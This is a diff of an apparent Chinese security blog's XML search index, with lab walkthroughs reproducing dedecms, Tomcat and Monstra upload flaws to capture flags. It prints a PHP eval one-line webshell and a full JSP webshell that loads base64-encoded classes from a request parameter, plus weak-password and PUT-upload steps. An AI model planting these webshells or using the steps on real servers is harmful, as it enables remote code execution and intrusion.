@@ -56,95 +56,6 @@
       </tags>
   </entry>
   <entry>
-    <title>(CVE-2019-8933)漏洞复现</title>
-    <url>/2023/08/24/(CVE-2019-8933)-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1>（CVE-2019-8933)漏洞复现
-
-<p><em><strong>1.第一步，打开环境，这里我用的是80：14882端口</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps1.jpg"
-                      alt="img"
-                > </p>
-<p><em><strong>2.点击上传跳转页面</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps2.jpg"
-                      alt="img"
-                > </p>
-<p><em><strong>3.在upload&#x2F;后写dede进入到该管理后台</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps3.jpg"
-                      alt="img"
-                > </p>
-<p><em><strong>4.点击模板，进入到默认模板管理</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps4.jpg"
-                      alt="img"
-                > </p>
-<p><em><strong>5.新建模板</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps5.jpg"
-                      alt="img"
-                > </p>
-<p><em><strong>6.在后台输入一句话木马<?php eval($_POST[123]);?>点击保存</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps6.jpg"
-                      alt="img"
-                > </p>
-<p><em><strong>7.生成-更新主页HTML-浏览选择新建的模板-更改后缀为php</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps7.jpg"
-                      alt="img"
-                > </p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps8.jpg"
-                      alt="img"
-                > </p>
-<p><em><strong>8.使用蚁剑连接(<a class="link"   href="http://202.194.97.206:35497/uploads/index.php" >http://202.194.97.206:35497/uploads/index.php<i class="fas fa-external-link-alt"></i></a>)</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps9.jpg"
-                      alt="img"
-                > </p>
-<p><em><strong>9.连接成功！</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps10.jpg"
-                      alt="img"
-                > </p>
-<p><em><strong>10.成功在主目录下tmp文件夹中找到flag！</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/%EF%BC%88CVE-2019-8933-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps11.jpg"
-                      alt="img"
-                > </p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Sqli-Labs环境搭建</title>
     <url>/2023/07/26/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<h1 id="Sqli-Labs环境搭建"><a href="#Sqli-Labs环境搭建" class="headerlink" title="Sqli-Labs环境搭建"></a>Sqli-Labs环境搭建</h1><h4 id="SQLI，sql-injection，我们称之为sql注入。何为sql，英文：Structured-Query-Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS-SQL-Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。"><a href="#SQLI，sql-injection，我们称之为sql注入。何为sql，英文：Structured-Query-Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS-SQL-Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。" class="headerlink" title="SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。"></a><strong>SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。</strong></h4><p>​       </p>
@@ -257,6 +168,149 @@
       </tags>
   </entry>
   <entry>
+    <title>Tomcat-pass-getshell弱口令漏洞复现</title>
+    <url>/2023/08/24/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p><em><strong>1、开启环境，进入网站</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps1.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>2、点击Manager App，弱口令admin登录</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps2.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>3、登陆成功</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps3.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>4、制作jsp木马，下段jsp木马密码为：passwd，将下述代码保存为jsp格式，并将jsp格式文件打包压缩成为war文件格式进行上传。</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps4.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>5、&#x2F;压缩包文件名&#x2F;一句话木马.jsp</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps5.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>6、打开蚁剑，进行连接，连接成功！</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps6.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>7、查看主目录下的tmp文件，找到flag！</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat-pass-getshell%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps7.jpg"
+                      alt="img"
+                > </p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat文件上传(CVE-2017-12615)漏洞复现</title>
+    <url>/2023/08/24/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2017-12615)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p><em><strong>1、启动环境</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps1.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>2、打开Burpsuite进行抓包，点击网页刷新</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps2.jpg"
+                      alt="img"
+                > </p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h5 id="3、GET修改为PUT，在文件名后面添加斜杠-来进行绕过"><a href="#3、GET修改为PUT，在文件名后面添加斜杠-来进行绕过" class="headerlink" title="3、GET修改为PUT，在文件名后面添加斜杠 &#x2F; 来进行绕过"></a><em>3、GET修改为PUT，在文件名后面添加斜杠 &#x2F; 来进行绕过</em></h5><p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps3.jpg"
+                      alt="img"
+                > </p>
+<h5 id="4、写入jsp一句话木马"><a href="#4、写入jsp一句话木马" class="headerlink" title="4、写入jsp一句话木马"></a><em>4、写入jsp一句话木马</em></h5><p>&lt;%!</p>
+<p>  class U extends ClassLoader {</p>
+<p>​    U(ClassLoader c) {</p>
+<p>​      super(c);</p>
+<p>​    }</p>
+<p>​    public Class g(byte[] b) {</p>
+<p>​      return super.defineClass(b, 0, b.length);</p>
+<p>​    }</p>
+<p>  }</p>
+<p>  public byte[] base64Decode(String str) throws Exception {</p>
+<p>​    try {</p>
+<p>​      Class clazz &#x3D; Class.forName(“sun.misc.BASE64Decoder”);</p>
+<p>​      return (byte[]) clazz.getMethod(“decodeBuffer”, String.class).invoke(clazz.newInstance(), str);</p>
+<p>​    } catch (Exception e) {</p>
+<p>​      Class clazz &#x3D; Class.forName(“java.util.Base64”);</p>
+<p>​      Object decoder &#x3D; clazz.getMethod(“getDecoder”).invoke(null);</p>
+<p>​      return (byte[]) decoder.getClass().getMethod(“decode”, String.class).invoke(decoder, str);</p>
+<p>​    }</p>
+<p>  }</p>
+<p>%&gt;</p>
+<p>&lt;%</p>
+<p>  String cls &#x3D; request.getParameter(“passwd”);</p>
+<p>  if (cls !&#x3D; null) {</p>
+<p>​    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</p>
+<p>  }</p>
+<p>%&gt;</p>
+<h5 id="5、写入jsp一句话木马，进入该网址"><a href="#5、写入jsp一句话木马，进入该网址" class="headerlink" title="5、写入jsp一句话木马，进入该网址"></a><em>5、写入jsp一句话木马，进入该网址</em></h5><p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps4.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>6、连接蚁剑，密码pass</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps5.jpg"
+                      alt="img"
+                > </p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps6.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>7、进入该主目录下tmp，找到flag</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/Tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2017-12615-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps7.jpg"
+                      alt="img"
+                > </p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS漏洞详解</title>
     <url>/2023/08/11/XSS%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
     <content><![CDATA[<h3 id="一、XSS漏洞原理"><a href="#一、XSS漏洞原理" class="headerlink" title="一、XSS漏洞原理"></a><strong>一、XSS漏洞原理</strong></h3><p>XSS，即跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，少数情况下还有ActionScript、VBScript等语言），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。</p>
@@ -285,6 +339,93 @@
 <p>●对于反射型和存储型XSS，可以在数据返回给客户端浏览器时，将敏感字符进行转义，如：将单引号进行编码替换（十进制编码’、十六进制编码’、HTML编码&amp;apos、Unicode编码\u0027等）。</p>
 <p>●对于DOM型XSS，可以使用上下文敏感数据编码。如：在PHP中的htmlspecialchars（）、htmlentities（）函 数可以将一些预定义的字符转换为HTML实体，如：小于转化为&lt;、大于转化为&gt;、双引号转化为”、单引号转化为&amp;apos、与转化 为&amp;等。</p>
 <p>●启用浏览器的HttpOnly特性可以组织客户端脚本访问cookie。如：在PHP中可以通过下面的代码设置cookie并启用HttpOnly。</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dedecms文件上传(CVE-2019-8933)漏洞复现</title>
+    <url>/2023/08/24/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p><em><strong>1.第一步，打开环境，这里我用的是80：14882端口</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174353400.png"
+                      alt="image-20230824174353400"
+                ></p>
+<p><em><strong>2.点击上传跳转页面</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174418389.png"
+                      alt="image-20230824174418389"
+                ></p>
+<p><em><strong>3.在upload&#x2F;后写dede进入到该管理后台</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174441418.png"
+                      alt="image-20230824174441418"
+                ></p>
+<p><em><strong>4.点击模板，进入到默认模板管理</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174503674.png"
+                      alt="image-20230824174503674"
+                ></p>
+<p><em><strong>5.新建模板</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174518062.png"
+                      alt="image-20230824174518062"
+                ></p>
+<p><em><strong>6.在后台输入一句话木马<?php eval($_POST[123]);?>点击保存</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174605190.png"
+                      alt="image-20230824174605190"
+                ></p>
+<p><em><strong>7.生成-更新主页HTML-浏览选择新建的模板-更改后缀为php</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174619578.png"
+                      alt="image-20230824174619578"
+                ></p>
+<p> <img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174632722.png"
+                      alt="image-20230824174632722"
+                ></p>
+<p><em><strong>8.使用蚁剑连接<a class="link"   href="http://192.168.2.211:14882/uploads/index.php" >http://192.168.2.211:14882/uploads/index.php<i class="fas fa-external-link-alt"></i></a></strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174659762.png"
+                      alt="image-20230824174659762"
+                ></p>
+<p><em><strong>9.连接成功！</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174712986.png"
+                      alt="image-20230824174712986"
+                ></p>
+<p><em><strong>10.成功在主目录下tmp文件夹中找到flag！</strong></em></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174729905.png"
+                      alt="image-20230824174729905"
+                ></p>
 ]]></content>
       <categories>
         <category>网络安全</category>
@@ -423,84 +564,56 @@
       </tags>
   </entry>
   <entry>
-    <title>dedecms文件上传(CVE-2019-8933)漏洞复现</title>
-    <url>/2023/08/24/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p><em><strong>1.第一步，打开环境，这里我用的是80：14882端口</strong></em></p>
+    <title>monstra文件上传(CVE-2020-13384)漏洞复现</title>
+    <url>/2023/08/24/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2020-13384)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p><em><strong>1、打开环境，注册账号账号密码统一设置为admin方便记忆，<a class="link"   href="mailto:&#x31;&#50;&#51;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#109;" >&#x31;&#50;&#51;&#64;&#113;&#113;&#46;&#x63;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a>设置为邮箱</strong></em></p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174353400.png"
-                      alt="image-20230824174353400"
-                ></p>
-<p><em><strong>2.点击上传跳转页面</strong></em></p>
+                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps8.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>2、点击logged in</strong></em></p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174418389.png"
-                      alt="image-20230824174418389"
-                ></p>
-<p><em><strong>3.在upload&#x2F;后写dede进入到该管理后台</strong></em></p>
+                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps9.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>3、点击upload file</strong></em></p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174441418.png"
-                      alt="image-20230824174441418"
-                ></p>
-<p><em><strong>4.点击模板，进入到默认模板管理</strong></em></p>
+                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps10.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>4、点击上传文件抓包</strong></em></p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174503674.png"
-                      alt="image-20230824174503674"
-                ></p>
-<p><em><strong>5.新建模板</strong></em></p>
+                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps11.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>5、修改文件名为phar,点击放行，可以看到文件上传成功，点击文件获取路径：</strong></em></p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174518062.png"
-                      alt="image-20230824174518062"
-                ></p>
-<p><em><strong>6.在后台输入一句话木马<?php eval($_POST[123]);?>点击保存</strong></em></p>
+                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps12.jpg"
+                      alt="img"
+                > </p>
+<p><em><strong>6、直接查看目录tmp</strong></em></p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174605190.png"
-                      alt="image-20230824174605190"
-                ></p>
-<p><em><strong>7.生成-更新主页HTML-浏览选择新建的模板-更改后缀为php</strong></em></p>
+                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps13.jpg"
+                      alt="img"
+                > </p>
 <p><img  
                      lazyload
                      alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174619578.png"
-                      alt="image-20230824174619578"
-                ></p>
-<p> <img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174632722.png"
-                      alt="image-20230824174632722"
-                ></p>
-<p><em><strong>8.使用蚁剑连接<a class="link"   href="http://192.168.2.211:14882/uploads/index.php" >http://192.168.2.211:14882/uploads/index.php<i class="fas fa-external-link-alt"></i></a></strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174659762.png"
-                      alt="image-20230824174659762"
-                ></p>
-<p><em><strong>9.连接成功！</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174712986.png"
-                      alt="image-20230824174712986"
-                ></p>
-<p><em><strong>10.成功在主目录下tmp文件夹中找到flag！</strong></em></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174729905.png"
-                      alt="image-20230824174729905"
-                ></p>
+                     data-src="/../images/monstra%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2020-13384-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/wps14.jpg"
+                      alt="img"
+                > </p>
 ]]></content>
       <categories>
         <category>网络安全</category>
